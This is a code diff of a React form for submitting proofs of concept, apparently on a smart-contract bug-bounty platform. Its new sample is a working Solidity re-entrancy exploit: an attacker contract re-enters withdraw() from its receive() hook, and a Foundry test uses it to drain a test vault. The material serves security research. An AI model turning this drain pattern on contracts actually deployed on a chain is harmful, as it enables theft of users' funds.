@@ -2,19 +2,48 @@ import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { api, type Program, type SubmitResponse } from "../lib/api";
 
-const SAMPLE_POC = `// Sample re-entrancy PoC — replace with your own
+const SAMPLE_POC = `// SPDX-License-Identifier: MIT
 pragma solidity 0.8.24;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
-contract Exploit is Test {
-    function test_proves_the_bug() public {
-        // your steps here…
-        console.log("FUNDS_AT_RISK_WEI:", 1 ether);
-        assertTrue(true);
+interface IVault {
+    function deposit() external payable;
+    function withdraw(uint256) external;
+    function totalBalance() external view returns (uint256);
+}
+
+contract Attacker {
+    IVault public vault;
+    uint256 public seed;
+    constructor(address _vault) payable {
+        vault = IVault(_vault);
+        seed = msg.value;
+    }
+    function pwn() external {
+        vault.deposit{value: seed}();
+        vault.withdraw(seed);
+    }
+    receive() external payable {
+        if (address(vault).balance >= seed) vault.withdraw(seed);
+    }
+}
+
+contract ExploitVaultTest is Test {
+    function test_drain_vulnerable_vault() public {
+        address vault = deployCode("VulnerableVault.sol:VulnerableVault");
+        vm.deal(address(this), 100 ether);
+        IVault(vault).deposit{value: 5 ether}();
+        Attacker attacker = new Attacker{value: 1 ether}(vault);
+        attacker.pwn();
+        uint256 stolen = address(attacker).balance;
+        assertGt(stolen, 5 ether, "attacker should drain pool");
+        console.log("FUNDS_AT_RISK_WEI:", stolen);
     }
 }
 `;
+
+const MOCK_RESEARCHER_ADDR = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC";
 
 export default function Submit() {
   const navigate = useNavigate();
@@ -23,7 +52,9 @@ export default function Submit() {
   const [chainId, setChainId] = useState<number>(84532);
   const [target, setTarget] = useState<string>("");
   const [forkBlock, setForkBlock] = useState<string>("");
-  const [researcher, setResearcher] = useState<string>("");
+  const [researcher, setResearcher] = useState<string>(
+    import.meta.env.VITE_MOCK_MODE === "true" ? MOCK_RESEARCHER_ADDR : "",
+  );
   const [poc, setPoc] = useState<string>(SAMPLE_POC);
   const [busy, setBusy] = useState(false);
   const [result, setResult] = useState<SubmitResponse | null>(null);
